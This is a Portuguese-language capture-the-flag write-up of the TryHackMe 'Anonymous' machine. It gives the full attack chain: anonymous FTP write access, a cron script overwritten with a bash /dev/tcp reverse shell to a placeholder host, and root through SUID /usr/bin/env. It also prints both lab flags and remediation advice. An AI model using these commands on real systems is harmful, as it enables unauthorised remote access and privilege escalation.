# 1 — Visão geral da metodologia

1. **Objetivo:** comprovar a exploração do serviço FTP exposto e elevar privilégios até root.
    
2. **Estrutura:** Recon → Enumeração FTP → Shell via cron → Privesc SUID → Flags.
    
3. **Princípios:** documentação completa e reprodutível.
    

---

# Report — Máquina: `Anonymous` — `10.65.137.77`

- **Fonte:** THM
    
- **Data:** 2025-11-28
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Medium
    
- **Início:** 15:04
    
- **Finalizado:** 15:53
    
- **Tempo gasto:** 49 minutos
    

---

## 1) Executive summary

FTP anônimo com permissão de escrita em diretório crítico possibilitou substituição de script executado por cron, gerando reverse shell como user. Elevação de privilégio foi obtida usando **/usr/bin/env SUID**, permitindo acesso root e exfiltração das flags.

---

## 2) Escopo & limitações

- **Alvo:** `10.65.137.77`
    
- **Serviços:** FTP, SSH, Samba
    
- **Ferramentas:** Nmap, FTP, Netcat, find, Linux privesc básico
    
- **Limitações:** nenhuma definida pelo lab
    

---

## 3) Metodologia aplicada

- Recon com mapeamento de portas
    
- Identificação de acesso FTP anônimo
    
- Enumeração e detecção de cron job manipulável
    
- Exploração com reverse shell
    
- Privesc via binário SUID `env`
    
- Flags coletadas
    

---

## 4) Achado principal

**Vulnerabilidade:** FTP anônimo + cron job manipulável  
**Local:** `/scripts/clean.sh`  
**PoC resumida:**

`echo -e "#!/bin/bash\nbash -c 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'" > clean.sh`

Resultado: reverse shell executada automaticamente pelo cron

---

## 5) Evidências / PoC (resumo)

### Scan inicial

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.137.77`

→ FTP anônimo habilitado

### Acesso FTP

`ftp 10.65.137.77 Name: anonymous`

### Enumeração

`cd /scripts ls -la`

→ `clean.sh` editável por todos (provável cron job)

### Reverse shell inserida pelo FTP

`echo -e "#!/bin/bash\nbash -c 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'" > clean.sh nc -lvnp 4444`

**Flag user:**

`cat /home/user.txt ➜ 90d6f992585815ff991e68748c414740`

---

## 6) Impacto & Severidade

**Severidade:** Alta  
Execução remota automatizada via cron + privesc com SUID = controle total do host.

---

## 7) Reproduzir (passo-a-passo)

1️⃣ Recon:

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.137.77`

2️⃣ Acesso FTP anônimo:

`ftp anonymous@10.65.137.77`

3️⃣ Substituir `clean.sh`:

`cd /scripts put clean.sh`

4️⃣ Capturar shell via netcat

5️⃣ Privesc via SUID:

`find / -perm -4000 -type f 2>/dev/null /usr/bin/env /bin/sh -p`

6️⃣ Coleta das flags

---

## 8) Recomendações (para gestores)

- Desabilitar FTP anônimo e usar SFTP com autenticação forte
    
- Corrigir permissões de diretórios e scripts de cron
    
- Remover SUID de binários desnecessários
    

---

## 9) Recomendações técnicas

- Ajustar permissões:
    

`chmod 700 /scripts/clean.sh chown root:root /scripts/clean.sh`

- Remover SUID de env:
    

`chmod -s /usr/bin/env`

- Monitorar cron jobs com auditoria de integridade
    

---

## 10) Apêndice técnico

**Flags:**

- User → `90d6f992585815ff991e68748c414740`
    
- Root → `4d930091c31a622a7ed10f27999af363`
    

**Arquivos recomendados**

#### Nmap

![](Nmap_Anonymous.txt)

---

## 11) Lições aprendidas / Follow-up

- FTP anônimo ainda é amplamente explorável
    
- Cron jobs inseguros geram escalonamento garantido
    
- Verificação de SUIDs é passo obrigatório de privesc